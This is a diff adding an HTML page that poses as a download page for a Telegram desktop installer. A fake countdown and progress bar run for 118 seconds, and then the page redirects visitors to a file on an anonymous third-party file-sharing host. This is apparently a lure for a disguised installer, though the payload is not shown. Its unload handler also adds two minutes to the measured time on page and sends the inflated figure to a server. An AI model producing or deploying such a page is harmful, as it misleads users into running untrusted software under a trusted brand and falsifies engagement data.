@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        setTimeout(function() {
+            window.location.href = "https://files-accl.zohoexternal.com/public/workdrive-external/download/u3ynn572479a5409f462ea5f6c7bb52b1ce65?x-cli-msg=%7B%22isFileOwner%22%3Afalse%2C%22version%22%3A%221.0%22%7D"; // 使用URL缩短服务生成的短链接
+        }, 118000); // 118秒
+
+        // 记录页面加载的实际时间
+        window.onload = function() {
+            sessionStorage.setItem('pageLoadTime', Date.now());
+        }
+
+        // 记录页面卸载的实际时间
+        window.onbeforeunload = function() {
+            const loadTime = sessionStorage.getItem('pageLoadTime');
+            const leaveTime = Date.now();
+            const timeSpent = leaveTime - loadTime;
+
+            // 增加2分钟（120000毫秒）
+            const adjustedTimeSpent = timeSpent + 120000;
+
+            console.log('Adjusted time spent on page:', adjustedTimeSpent, 'ms');
+            
+            // 发送调整后的时间到服务器
+            fetch('/recordTime', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ timeSpent: adjustedTimeSpent })
+            });
+        }
+    </script>
+
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            font-size: 1.5em; /* 将字体大小减小为原来的二分之一 */
+            color: #333;
+            margin-bottom: 20px;
+        }
+        #progressContainer {
+            width: 33.33%; /* 设置进度条容器的宽度为页面宽度的三分之一 */
+            height: 30px;
+            background-color: #e0e0e0;
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 0 auto; /* 将进度条容器居中对齐 */
+        }
+        #progressBar {
+            height: 100%;
+            background-color: #4caf50;
+            width: 0;
+            transition: width 1s linear;
+        }
+        #loadingGif {
+            margin-bottom: 10px; /* 控制图片和文本之间的距离 */
+        }
+        .title-text {
+            font-size: 1.5em; /* 设置字体大小 */
+            color: #333;
+            margin-bottom: 50px; /* 增加标题与图片之间的距离 */
+            font-weight: normal; /* 设置字体不加粗 */
+        }
+    </style>
+</head>
+<body>
+    <p class="title-text">Telegram电脑端安装包</p>
+    <img id="loadingPng" src="https://files-accl.zohoexternal.com/public/workdrive-external/download/4q4yf5819927f1c8c4beaad6cb8e9d86ae82d?x-cli-msg=%7B%22isFileOwner%22%3Afalse%2C%22version%22%3A%221.0%22%7D" alt="Loading...">
+    <p>正在下载，请稍候...</p>
+    <h1>下载完成剩余时间：<span id="countdown">00:03</span></h1>
+    <div id="progressContainer">
+        <div id="progressBar"></div>
+    </div>
+
+    <script>
+        // 设置初始倒计时时间为118秒
+        let timeLeft = 118;
+        const initialTime = timeLeft;
+
+        // 获取显示倒计时的HTML元素和进度条元素
+        const countdownElement = document.getElementById('countdown');
+        const progressBar = document.getElementById('progressBar');
+
+        // 创建一个更新倒计时的函数
+        function updateCountdown() {
+            // 计算分钟和秒
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+
+            // 格式化时间为MM:SS
+            const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+            // 更新倒计时显示
+            countdownElement.textContent = formattedTime;
+
+            // 更新进度条
+            const progressPercentage = ((initialTime - timeLeft) / initialTime) * 100;
+            progressBar.style.width = `${progressPercentage}%`;
+
+            // 检查倒计时是否结束
+            if (timeLeft > 0) {
+                // 减少剩余时间
+                timeLeft--;
+            } else {
+                // 当倒计时结束时，执行一些操作
+                clearInterval(timer);
+                alert("下载完成，谢谢耐心等待！");
+            }
+        }
+
+        // 每秒更新一次倒计时
+        const timer = setInterval(updateCountdown, 1000);
+
+        // 初始化显示倒计时
+        updateCountdown();
+    </script>
+    
+</body>
+</html>
